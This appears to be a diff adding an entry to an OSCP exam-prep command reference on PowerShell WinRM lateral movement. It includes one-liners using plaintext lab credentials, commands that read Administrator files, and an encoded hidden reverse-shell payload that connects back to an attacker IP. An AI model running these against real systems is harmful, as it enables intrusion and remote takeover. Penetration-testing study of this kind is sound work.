@@ -1,0 +1,96 @@
+{
+  "commands": [
+    {
+      "id": "ps-winrm-invoke-command",
+      "name": "PowerShell WinRM Invoke-Command Remote Execution",
+      "description": "Execute commands remotely via WinRM using Invoke-Command with credential object",
+      "command": "Invoke-Command -ComputerName <TARGET> -Credential $credential -ScriptBlock {<COMMAND>}",
+      "category": "LATERAL_MOVEMENT",
+      "subcategory": "WINRM",
+      "os": "WINDOWS",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target hostname or IP address",
+          "example": "192.168.50.73",
+          "required": true
+        },
+        {
+          "name": "<COMMAND>",
+          "description": "PowerShell command(s) to execute on remote host",
+          "example": "whoami; hostname",
+          "required": true
+        }
+      ],
+      "flags": [
+        {
+          "flag": "-ComputerName",
+          "description": "Target computer hostname or IP address for remote execution",
+          "default_value": null
+        },
+        {
+          "flag": "-Credential",
+          "description": "PSCredential object containing authentication credentials",
+          "default_value": "Current user context"
+        },
+        {
+          "flag": "-ScriptBlock",
+          "description": "PowerShell code block to execute on remote system (wrapped in curly braces {})",
+          "default_value": null
+        }
+      ],
+      "examples": [
+        {
+          "command": "$u='jen';$p='Nexus123!';$s=ConvertTo-SecureString $p -AsPlaintext -Force;$c=New-Object System.Management.Automation.PSCredential $u,$s;Invoke-Command -ComputerName 192.168.50.73 -Credential $c -ScriptBlock {whoami; hostname}",
+          "description": "One-liner: Create credentials and execute whoami/hostname on remote host 192.168.50.73",
+          "context": "Quick verification of successful lateral movement"
+        },
+        {
+          "command": "Invoke-Command -ComputerName 192.168.117.70 -Credential $credential -ScriptBlock {Get-Content C:\\Users\\Administrator\\Desktop\\*.txt}",
+          "description": "Retrieve flag file from administrator's desktop on remote host (assuming credential object already created)",
+          "context": "OSCP flag retrieval without interactive session"
+        },
+        {
+          "command": "Invoke-Command -ComputerName FILES04 -Credential $credential -ScriptBlock {powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAiACwANAA0ADMAKQA7AA...}",
+          "description": "Execute base64-encoded reverse shell payload on remote host via WinRM",
+          "context": "Full lateral movement with reverse shell"
+        },
+        {
+          "command": "Invoke-Command -ComputerName 192.168.50.73 -Credential $credential -ScriptBlock {dir C:\\Users\\Administrator\\Desktop}",
+          "description": "List files on remote administrator desktop to locate flags before retrieval",
+          "context": "Enumeration before flag capture"
+        }
+      ],
+      "educational": {
+        "purpose": "Execute PowerShell commands on remote Windows hosts via WinRM without establishing interactive session - ideal for quick one-off commands or flag retrieval",
+        "manual_alternative": "Use Enter-PSSession for interactive shell, then run commands manually (slower but more flexible)",
+        "common_failures": [
+          "WinRM not enabled on target (port 5985/5986 closed) - use winrs or WMI instead",
+          "User not in Remote Management Users or Administrators group on target",
+          "UAC remote restrictions block non-domain users even with local admin credentials"
+        ],
+        "when_to_use": [
+          "Quick command execution without needing persistent session",
+          "Flag retrieval from known file paths on remote hosts",
+          "Running reverse shell payloads during lateral movement",
+          "Batch operations across multiple hosts (supports -ComputerName array)"
+        ],
+        "exam_relevance": "HIGH - fastest method for OSCP flag retrieval after lateral movement. Executes and returns results in single command.",
+        "time_estimate": "5-15 seconds per execution (faster than interactive sessions)"
+      },
+      "oscp_priority": "HIGH",
+      "tags": [
+        "POWERSHELL",
+        "WINRM",
+        "LATERAL_MOVEMENT",
+        "REMOTE_EXECUTION",
+        "OSCP:HIGH"
+      ],
+      "related_commands": [
+        "ps-winrm-credential-setup",
+        "ps-winrm-new-pssession",
+        "winrs-remote-execution"
+      ]
+    }
+  ]
+}
